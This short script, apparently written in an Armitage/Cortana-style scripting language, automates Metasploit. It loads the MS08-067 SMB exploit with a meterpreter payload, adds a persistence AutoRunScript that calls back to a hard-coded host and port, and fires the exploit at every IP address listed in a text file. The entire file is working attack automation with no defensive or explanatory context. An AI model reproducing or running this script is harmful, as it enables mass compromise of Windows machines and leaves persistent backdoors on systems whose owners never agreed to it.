$MY_HOST = "192.168.95.155";
$MY_PORT = "1281";

println("setg AutoRunScript persistence -r $MY_HOST -p $MY_PORT -i 30 -S -U");
println("use exploit/windows/smb/ms08_067_netapi");
println("setg PAYLOAD windows/meterpreter/bind_tcp");

sub makeOwn {
	println("set RHOST $1");
	println("exploit -j");
}

$handle = openf("tmp/ips.txt");
while $text (readln($handle)) {
	makeOwn($text);
}


